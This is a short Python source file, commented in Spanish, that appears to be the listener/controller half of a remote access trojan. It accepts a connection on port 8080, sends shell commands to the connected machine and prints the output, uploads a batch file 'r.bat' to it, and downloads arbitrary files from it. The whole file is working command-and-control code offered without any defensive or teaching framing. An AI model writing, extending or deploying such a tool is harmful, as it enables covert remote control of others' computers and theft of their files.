import socket
from colorama import Fore,Style

class Connection():
    HOST=''
    PORT=8080
    conn=''
    addr=''
    
    def conecting(self):
        SOCK=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
        SOCK.bind((self.HOST,self.PORT))
        SOCK.listen(1)
        conn,addr = SOCK.accept()
        self.conn = conn
        self.addr= addr
        if self.conn:
            print(f"Conexion realizada con {self.addr[0]} puerto {self.addr[1]} ")
    def run_command(self,command):
        cmd=command.encode()
        self.conn.send(b'cmd')
        try:
            self.conn.send(cmd)
        except:
            print("No se pudo enviar ningún dato.")
        
           
        data=self.conn.recv(1024)

        if data:
            print(Fore.GREEN+data.decode(encoding="ascii",errors="ignore"))
            print(Style.RESET_ALL) 
                    
        else:
            print("[x] No se recibió ninguna respuesta.")
                   

    def upload_file(self):
       
        self.conn.send(b'upload')
        with open("r.bat","rb") as fileContent:
            for x in fileContent:
                try:
                    self.conn.send(x)
                except:
                    print("[x] Hubo un problema a la hora de enviar el archivo.")
        self.conn.send(b'stop')
        fileinfo=self.conn.recv(1024)
        if fileinfo:
            print(fileinfo.decode())

    def download_file(self,path,fout="out"):
        try:
            self.conn.send(b'download')
            self.conn.send(path)
        except:
             print("[x] Algo salio mal a la hora de enviar el Path.")
        
        try:
         dfile = self.conn.recv(1024)
         if dfile == b"0":
             print("[x] El archivo no existe o el path está mal especificado.")
         else:
            with open(fout,"wb") as fc:
                fc.write(dfile)
        except:
            print("[x] Algo salio mal a la hora de recibir o guardar el archivo")
        
            
                

       
            

  



        